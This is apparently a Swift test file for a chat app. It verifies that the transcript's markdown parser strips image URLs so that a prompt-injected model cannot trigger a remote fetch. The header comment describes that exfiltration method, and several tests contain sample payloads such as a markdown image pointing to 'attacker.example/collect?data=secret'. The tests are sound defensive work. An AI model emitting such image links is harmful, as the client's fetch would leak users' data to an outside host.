import Foundation
import Testing
import Textual
@testable import teemoon

// The transcript renders assistant-authored markdown. A hostile or
// prompt-injected model that emits `![](https://attacker/?leak=…)` must not
// cause the client to fetch that URL — Textual auto-fetches image runs on
// render, with no tap, over a URLSession outside the E2EE transport, so a fetch
// would exfiltrate whatever the model encodes into the URL. Every transcript
// render parses through `CachedMarkdownParser.shared`, which must drop image
// URLs before they can become an attachment fetch.
@Suite("Assistant markdown cannot trigger a remote fetch")
@MainActor
struct MarkdownAttachmentExfiltrationTests {

    // Proves the strip is load-bearing: the raw parser Textual would otherwise
    // use emits an `imageURL` run that the default loader auto-fetches. If this
    // ever stops holding, the fetch path is gone and the strip is moot — but so
    // is the guarantee, so pin it.
    @Test func rawParser_emitsImageURL_soTheStripMatters() throws {
        let raw = AttributedStringMarkdownParser(baseURL: nil)
        let parsed = try raw.attributedString(for: "![x](https://attacker.example/pixel.png)")
        #expect(parsed.runs.contains { $0.imageURL != nil })
    }

    @Test func transcriptParser_dropsImageURL() throws {
        let markdown = "# heading\n\n![leak](https://attacker.example/collect?data=secret)"
        let parsed = try CachedMarkdownParser.shared.attributedString(for: markdown)
        #expect(parsed.runs.allSatisfy { $0.imageURL == nil })
    }

    @Test func transcriptParser_dropsBareImageURL() throws {
        let parsed = try CachedMarkdownParser.shared.attributedString(
            for: "![x](https://attacker.example/pixel.png?q=1)")
        #expect(parsed.runs.allSatisfy { $0.imageURL == nil })
    }

    @Test func transcriptParser_keepsAltTextVisible() throws {
        let parsed = try CachedMarkdownParser.shared.attributedString(
            for: "![diagram](https://x.example/y.png)")
        #expect(String(parsed.characters).contains("diagram"))
    }

    @Test func withoutRemoteImages_leavesPlainTextUntouched() {
        let plain = AttributedString("just text, no images")
        let stripped = CachedMarkdownParser.withoutRemoteImages(plain)
        #expect(String(stripped.characters) == "just text, no images")
        #expect(stripped.runs.allSatisfy { $0.imageURL == nil })
    }
}
